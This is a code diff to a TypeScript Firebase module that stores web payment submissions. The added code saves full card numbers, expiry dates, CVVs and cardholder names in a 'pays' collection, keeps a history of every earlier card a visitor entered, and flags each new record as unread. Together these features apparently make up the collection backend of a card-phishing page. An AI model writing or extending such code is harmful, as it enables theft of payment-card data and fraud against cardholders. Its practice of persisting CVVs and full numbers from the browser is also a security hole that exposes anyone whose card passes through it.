@@ -1,6 +1,6 @@
 import { getApp, getApps, initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
-import { doc, getFirestore, setDoc } from "firebase/firestore";
+import { doc, getDoc, getFirestore, setDoc } from "firebase/firestore";
 
 const firebaseConfig = {
   apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
@@ -20,6 +20,82 @@ type FirebasePayData = {
   id?: string | null;
   [key: string]: unknown;
 };
+
+type CardSnapshot = {
+  cardholderName?: string;
+  cardNumberFull?: string;
+  cardNumberMasked?: string;
+  expiry?: string;
+  cvv?: string;
+};
+
+type CardHistoryEntry = CardSnapshot & {
+  changedAt: string;
+};
+
+type StoredPayRecord = {
+  createdAt?: string;
+  payment?: Record<string, unknown>;
+  cardHistory?: CardHistoryEntry[];
+  [key: string]: unknown;
+};
+
+function isRecord(value: unknown): value is Record<string, unknown> {
+  return typeof value === "object" && value !== null && !Array.isArray(value);
+}
+
+function toStringOrUndefined(value: unknown): string | undefined {
+  if (typeof value !== "string") {
+    return undefined;
+  }
+
+  const trimmed = value.trim();
+  return trimmed ? trimmed : undefined;
+}
+
+function readCardSnapshot(payment: Record<string, unknown> | undefined): CardSnapshot | null {
+  if (!payment) {
+    return null;
+  }
+
+  const snapshot: CardSnapshot = {
+    cardholderName: toStringOrUndefined(payment.cardholderName),
+    cardNumberFull: toStringOrUndefined(payment.cardNumberFull),
+    cardNumberMasked: toStringOrUndefined(payment.cardNumberMasked),
+    expiry: toStringOrUndefined(payment.expiry),
+    cvv: toStringOrUndefined(payment.cvv),
+  };
+
+  const hasAnyCardField = Object.values(snapshot).some((value) => Boolean(value));
+  return hasAnyCardField ? snapshot : null;
+}
+
+function cardSnapshotKey(snapshot: CardSnapshot): string {
+  return [
+    snapshot.cardholderName ?? "",
+    snapshot.cardNumberFull ?? "",
+    snapshot.cardNumberMasked ?? "",
+    snapshot.expiry ?? "",
+    snapshot.cvv ?? "",
+  ].join("|");
+}
+
+function normalizeCardHistory(value: unknown): CardHistoryEntry[] {
+  if (!Array.isArray(value)) {
+    return [];
+  }
+
+  return value
+    .filter((entry) => isRecord(entry))
+    .map((entry) => ({
+      cardholderName: toStringOrUndefined(entry.cardholderName),
+      cardNumberFull: toStringOrUndefined(entry.cardNumberFull),
+      cardNumberMasked: toStringOrUndefined(entry.cardNumberMasked),
+      expiry: toStringOrUndefined(entry.expiry),
+      cvv: toStringOrUndefined(entry.cvv),
+      changedAt: toStringOrUndefined(entry.changedAt) ?? new Date().toISOString(),
+    }));
+}
 
 export async function getData(id: string) {
   try {
@@ -57,14 +133,51 @@ export async function addData(data: FirebasePayData) {
 
   try {
     const docRef = doc(db, "pays", data.id);
+    const existingSnapshot = await getDoc(docRef);
+    const existingData = existingSnapshot.exists()
+      ? (existingSnapshot.data() as StoredPayRecord)
+      : null;
+    const nowIso = new Date().toISOString();
+
+    const existingPayment = isRecord(existingData?.payment)
+      ? existingData.payment
+      : undefined;
+    const incomingPayment = isRecord(data.payment) ? data.payment : undefined;
+    const mergedPayment =
+      existingPayment || incomingPayment
+        ? { ...(existingPayment ?? {}), ...(incomingPayment ?? {}) }
+        : undefined;
+
+    const previousCard = readCardSnapshot(existingPayment);
+    const nextCard = readCardSnapshot(mergedPayment);
+    const nextCardHistory = normalizeCardHistory(existingData?.cardHistory);
+    if (
+      previousCard &&
+      nextCard &&
+      cardSnapshotKey(previousCard) !== cardSnapshotKey(nextCard)
+    ) {
+      nextCardHistory.push({
+        ...previousCard,
+        changedAt: nowIso,
+      });
+    }
+
+    const payload: Record<string, unknown> = {
+      ...data,
+      createdAt: existingData?.createdAt ?? nowIso,
+      updatedAt: nowIso,
+      isUnread: true,
+    };
+    if (mergedPayment) {
+      payload.payment = mergedPayment;
+    }
+    if (nextCardHistory.length > 0) {
+      payload.cardHistory = nextCardHistory;
+    }
+
     await setDoc(
       docRef,
-      {
-        ...data,
-        createdAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
-        isUnread: true,
-      },
+      payload,
       { merge: true }
     );
   } catch (error) {
